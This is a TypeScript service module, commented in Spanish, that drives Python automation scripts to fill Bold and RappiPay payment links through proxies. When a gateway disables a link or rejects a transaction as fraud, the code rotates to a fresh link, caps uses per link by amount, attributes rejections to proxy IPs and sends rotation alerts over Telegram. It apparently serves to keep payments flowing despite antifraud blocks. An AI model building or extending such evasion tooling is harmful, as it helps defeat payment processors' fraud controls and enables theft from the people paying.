import path from 'node:path';
import { spawn } from 'node:child_process';
import { env } from '../config/env';
import { createBoldPaymentLink } from './bold-api.service';
import {
  MASTER_ADMIN_ID,
  resolveOwnerId,
  getGatewaySettings,
  getEffectiveRappiUrl,
  incrementRappiLinkUse,
  recordRappiLinkFailure,
  markLinkBlockedAndRotate,
} from './settings.service';
import { sendLinkRotationTelegramAlert } from './telemetry.service';

export interface FillRequest {
  monto: string;
  banco: string;
  tipo: string;
  doc: string;
  nombre?: string;
  email?: string;
  celular?: string;
  url?: string;
  ownerId?: string;
  verify_pse?: boolean;
}

export interface FillResponse {
  enabled: boolean;
  png?: string;
  redirect_url: string;
  kushki_url?: string;
  proxy_ip?: string;
  reference_id?: string;
  gateway_used?: string;
  source_url?: string;
}

export async function executeFillBoldApi(
  data: FillRequest,
  userIdOrSlug = MASTER_ADMIN_ID
): Promise<FillResponse> {
  const ownerId = resolveOwnerId(userIdOrSlug || data.ownerId);
  const amount = Number(data.monto);
  const result = await createBoldPaymentLink({
    amount,
    payerEmail: data.email,
    description: data.banco || 'Servicio',
    ownerId,
  });

  return {
    enabled: true,
    redirect_url: result.url,
    reference_id: result.referenceId,
    gateway_used: 'bold_api',
  };
}

export async function executeFill(
  data: FillRequest,
  userIdOrSlug = MASTER_ADMIN_ID
): Promise<FillResponse> {
  const ownerId = resolveOwnerId(userIdOrSlug || data.ownerId);
  const settings = getGatewaySettings(ownerId);
  const provider = settings.gatewayProvider;

  if (provider === 'bold_api') {
    try {
      return await executeFillBoldApi(data, ownerId);
    } catch (err: any) {
      const msg = String(err?.message || '');
      if (
        msg.toLowerCase().includes('not active') ||
        msg.toLowerCase().includes('inhabilitado') ||
        msg.includes('PL_000')
      ) {
        const rot = markLinkBlockedAndRotate(settings.boldUrl, msg, 'bold_api', ownerId);
        await sendLinkRotationTelegramAlert({
          gateway: 'bold_api',
          blockedUrl: settings.boldUrl,
          nextUrl: null,
          reason: msg,
          activeRemaining: rot.activeRemaining,
          blockedTotal: rot.blockedTotal,
        }).catch(() => {});
      }
      throw err;
    }
  }

  if (provider === 'bold') {
    try {
      return await executeFillBold(data, ownerId);
    } catch (err: any) {
      const msg = String(err?.message || '');
      const usedUrl = data.url || settings.boldUrl;
      if (
        msg.toLowerCase().includes('inhabilitado') ||
        msg.toLowerCase().includes('rechazado') ||
        msg.toLowerCase().includes('disabled')
      ) {
        const rot = markLinkBlockedAndRotate(usedUrl, msg, 'bold', ownerId);
        await sendLinkRotationTelegramAlert({
          gateway: 'bold',
          blockedUrl: usedUrl,
          nextUrl: null,
          reason: msg,
          activeRemaining: rot.activeRemaining,
          blockedTotal: rot.blockedTotal,
        }).catch(() => {});
      }
      throw err;
    }
  }

  // Modo RappiPay con auto-rotación por uso (Estándar: 3 usos, Montos Grandes ≥$1M: 1 uso) y por bloqueo
  const effective = data.url
    ? { ownerId, url: data.url, tier: 'standard' as const, slot: undefined }
    : getEffectiveRappiUrl(userIdOrSlug || ownerId, data.monto);
  const effectiveOwnerId = effective.ownerId;
  const currentRappiUrl = effective.url || settings.rappiUrl || settings.paymentUrl;
  console.log(
    `[Fill Real][${effectiveOwnerId}] Seleccionado link RappiPay -> Monto: $${Number(
      String(data.monto || '0').replace(/[^\d]/g, '') || 0
    ).toLocaleString('es-CO')} | Grupo: ${
      effective.tier === 'high_amount' ? 'MONTOS GRANDES (aislado)' : 'ESTÁNDAR'
    }${effective.slot ? ` (Slot ${effective.slot})` : ''} | URL: ${currentRappiUrl}`
  );
  try {
    const res = await executeFillReal({ ...data, url: currentRappiUrl }, effectiveOwnerId);
    res.source_url = currentRappiUrl;
    incrementRappiLinkUse(currentRappiUrl, effectiveOwnerId, true);
    return res;
  } catch (err: any) {
    const msg = String(err?.message || 'Error en link de RappiPay');
    const isInputValidationError = msg.includes('inferior al mínimo permitido');

    const isInstantPermanentBlock =
      msg.includes('PSE_TRANSACTION_TERMINATED') ||
      msg.toLowerCase().includes('transactiontermination') ||
      msg.includes('El link de pago con PSE expiró') ||
      msg.includes('404') ||
      msg.includes('Página no encontrada');

    const isGatewayRejection =
      msg.includes('LINK_DEFINITIVAMENTE_BLOQUEADO') ||
      msg.includes('Link de pago PSE rechazado') ||
      msg.includes('006_0769_FRAUD_TRANSACTION_BAD') ||
      msg.toLowerCase().includes('inhabilitado por la pasarela') ||
      msg.includes('422');

    const isTemporaryError =
      msg.includes('ERROR_TEMPORAL_REINTENTABLE') ||
      msg.includes('No se generó redirección') ||
      msg.includes('No se detectó URL de redirección') ||
      msg.includes('timeout') ||
      msg.includes('Timeout') ||
      msg.includes('ERR_') ||
      msg.includes('Connection failed') ||
      isInputValidationError;

    let shouldBlockLink = isInstantPermanentBlock;
    let consecutiveFailures = 0;

    if (!shouldBlockLink && isGatewayRejection && !isTemporaryError) {
      const failInfo = recordRappiLinkFailure(currentRappiUrl, effectiveOwnerId);
      consecutiveFailures = failInfo.consecutiveFailures;
      // Exigir 3 rechazos consecutivos con distintas IPs antes de marcar un link como BLOQUEADO,
      // evitando bloquear links activos por un rechazo puntual de IP residencial o antifraude momentáneo.
      if (consecutiveFailures >= 3) {
        shouldBlockLink = true;
      } else {
        console.warn(
          `[Fill Real][${effectiveOwnerId}] ⚠️ Rechazo puntual (${consecutiveFailures}/3) en ${currentRappiUrl} (posible IP proxy; el link permanece ACTIVO): ${msg}`
        );
      }
    }

    if (shouldBlockLink) {
      const rotation = markLinkBlockedAndRotate(currentRappiUrl, msg, 'rappipay', effectiveOwnerId);
      await sendLinkRotationTelegramAlert({
        gateway: 'rappipay',
        blockedUrl: currentRappiUrl,
        nextUrl: rotation.rotatedTo,
        reason: msg,
        activeRemaining: rotation.activeRemaining,
        blockedTotal: rotation.blockedTotal,
      }).catch(() => {});

      if (rotation.rotatedTo && !data.url) {
        console.log(
          `[Auto-Rotación RappiPay][${effectiveOwnerId}] Reintentando cobro automáticamente con nuevo link: ${rotation.rotatedTo}`
        );
        const retryRes = await executeFillReal({ ...data, url: rotation.rotatedTo }, effectiveOwnerId);
        retryRes.source_url = rotation.rotatedTo;
        incrementRappiLinkUse(rotation.rotatedTo, effectiveOwnerId);
        return retryRes;
      }
    } else if (isTemporaryError || !isGatewayRejection) {
      console.warn(
        `[Fill Real][${effectiveOwnerId}] ⚠️ Fallo temporal de red o timeout (el link ${currentRappiUrl} NO está bloqueado y permanece ACTIVO): ${msg}`
      );
    }
    throw err;
  }
}

export function executeFillBold(
  data: FillRequest,
  userIdOrSlug = MASTER_ADMIN_ID
): Promise<FillResponse> {
  return new Promise((resolve, reject) => {
    const ownerId = resolveOwnerId(userIdOrSlug || data.ownerId);
    const settings = getGatewaySettings(ownerId);
    const pythonPath = env.pythonBin || 'python';
    const scriptPath = path.resolve(__dirname, '../../scripts/fill_bold.py');

    const proc = spawn(pythonPath, [scriptPath], {
      stdio: ['pipe', 'pipe', 'pipe'],
      windowsHide: true,
      env: {
        ...process.env,
        PROXY_HOST: settings.proxyHost || env.proxyHost,
        PROXY_PORT: settings.proxyPort || env.proxyPort,
        PROXY_SOCKS_PORT: settings.proxyPort || env.proxySocksPort,
        PROXY_USERNAME: settings.proxyUsername || env.proxyUsername,
        PROXY_PASSWORD: settings.proxyPassword || env.proxyPassword,
        PAYMENT_BOLD_URL: settings.boldUrl || env.paymentBoldUrl,
      },
    });

    let stdoutData = '';
    let stderrData = '';

    proc.stdout.on('data', (chunk) => {
      stdoutData += chunk.toString();
    });

    proc.stderr.on('data', (chunk) => {
      stderrData += chunk.toString();
      process.stderr.write(chunk);
    });

    proc.on('error', (err) => {
      reject(new Error(`No se pudo ejecutar la automatización de Bold: ${err.message}`));
    });

    proc.on('close', (code) => {
      if (code !== 0) {
        return reject(
          new Error(
            `El proceso de Bold falló (código ${code}): ${stderrData || stdoutData || 'Error desconocido'}`
          )
        );
      }

      try {
        const startMarker = '---JSON_START---';
        const endMarker = '---JSON_END---';

        let jsonString = '';
        if (stdoutData.includes(startMarker) && stdoutData.includes(endMarker)) {
          jsonString = stdoutData.split(startMarker)[1].split(endMarker)[0].trim();
        } else {
          const lines = stdoutData.trim().split(/\r?\n/).reverse();
          const found = lines.find((l) => l.trim().startsWith('{') && l.trim().endsWith('}'));
          if (found) jsonString = found.trim();
        }

        if (!jsonString) {
          throw new Error('No se encontró bloque JSON en la salida de Bold.');
        }

        const result = JSON.parse(jsonString) as FillResponse;
        result.gateway_used = 'bold';
        resolve(result);
      } catch (err: any) {
        reject(new Error(`Respuesta inválida de Bold: ${err.message}. Salida: ${stdoutData}`));
      }
    });

    const payload = {
      ...data,
      url: data.url || settings.boldUrl || env.paymentBoldUrl,
    };
    proc.stdin.write(JSON.stringify(payload));
    proc.stdin.end();
  });
}

export function executeFillReal(
  data: FillRequest,
  userIdOrSlug = MASTER_ADMIN_ID
): Promise<FillResponse> {
  return new Promise((resolve, reject) => {
    const ownerId = resolveOwnerId(userIdOrSlug || data.ownerId);
    const settings = getGatewaySettings(ownerId);
    const pythonPath = env.pythonBin || 'python';
    const scriptPath = path.resolve(__dirname, '../../scripts/fill_real.py');

    const proc = spawn(pythonPath, [scriptPath], {
      stdio: ['pipe', 'pipe', 'pipe'],
      windowsHide: true,
      env: {
        ...process.env,
        PROXY_HOST: settings.proxyHost || env.proxyHost,
        PROXY_PORT: settings.proxyPort || env.proxyPort,
        PROXY_SOCKS_PORT: settings.proxyPort || env.proxySocksPort,
        PROXY_USERNAME: settings.proxyUsername || env.proxyUsername,
        PROXY_PASSWORD: settings.proxyPassword || env.proxyPassword,
        PAYMENT_AUTOMATION_URL: settings.rappiUrl || env.paymentAutomationUrl,
      },
    });

    let stdoutData = '';
    let stderrData = '';
    let settled = false;

    const killTimer = setTimeout(() => {
      if (settled) return;
      settled = true;
      try {
        proc.kill('SIGKILL');
      } catch {
        // ignore
      }
      reject(
        new Error(
          'ERROR_TEMPORAL_REINTENTABLE: Timeout excedido (55s) esperando respuesta de la pasarela RappiPay.'
        )
      );
    }, 55000);

    const finishResolve = (val: FillResponse) => {
      if (settled) return;
      settled = true;
      clearTimeout(killTimer);
      resolve(val);
    };

    const finishReject = (err: Error) => {
      if (settled) return;
      settled = true;
      clearTimeout(killTimer);
      reject(err);
    };

    proc.stdout.on('data', (chunk) => {
      stdoutData += chunk.toString();
    });

    proc.stderr.on('data', (chunk) => {
      stderrData += chunk.toString();
      process.stderr.write(chunk);
    });

    proc.on('error', (err) => {
      finishReject(new Error(`No se pudo ejecutar el proceso de automatización de RappiPay: ${err.message}`));
    });

    proc.on('close', (code) => {
      if (settled) return;
      if (code !== 0) {
        return finishReject(
          new Error(
            `El proceso de llenado falló (código ${code}): ${stderrData || stdoutData || 'Error desconocido'}`
          )
        );
      }

      try {
        const startMarker = '---JSON_START---';
        const endMarker = '---JSON_END---';

        let jsonString = '';
        if (stdoutData.includes(startMarker) && stdoutData.includes(endMarker)) {
          jsonString = stdoutData.split(startMarker)[1].split(endMarker)[0].trim();
        } else {
          const lines = stdoutData.trim().split(/\r?\n/).reverse();
          const found = lines.find((l) => l.trim().startsWith('{') && l.trim().endsWith('}'));
          if (found) jsonString = found.trim();
        }

        if (!jsonString) {
          throw new Error('No se encontró bloque JSON en la salida.');
        }

        const result = JSON.parse(jsonString) as FillResponse;
        result.gateway_used = 'rappipay';
        finishResolve(result);
      } catch (err: any) {
        finishReject(new Error(`Respuesta inválida del script: ${err.message}. Salida: ${stdoutData}`));
      }
    });

    const payload = {
      ...data,
      url: data.url || settings.rappiUrl || env.paymentAutomationUrl,
    };
    proc.stdin.write(JSON.stringify(payload));
    proc.stdin.end();
  });
}
